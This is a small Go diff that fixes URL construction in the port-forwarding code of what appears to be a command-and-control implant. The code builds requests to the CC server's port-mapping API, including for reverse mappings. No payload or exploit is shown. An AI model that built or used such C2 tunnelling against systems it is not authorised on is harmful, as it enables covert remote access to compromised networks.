@@ -85,7 +85,7 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 	var (
 		session PortFwdSession
 
-		url = fmt.Sprintf("%s%s/%s",
+		url = fmt.Sprintf("%s/%s/%s",
 			def.CCAddress,
 			transport.PortMappingAPI,
 			sessionID)
@@ -154,7 +154,7 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 		// tell CC this is a reversed port mapping
 		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
 		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
-		url := fmt.Sprintf("%s%s/%s",
+		url := fmt.Sprintf("%s/%s/%s",
 			def.CCAddress,
 			transport.PortMappingAPI,
 			shID)
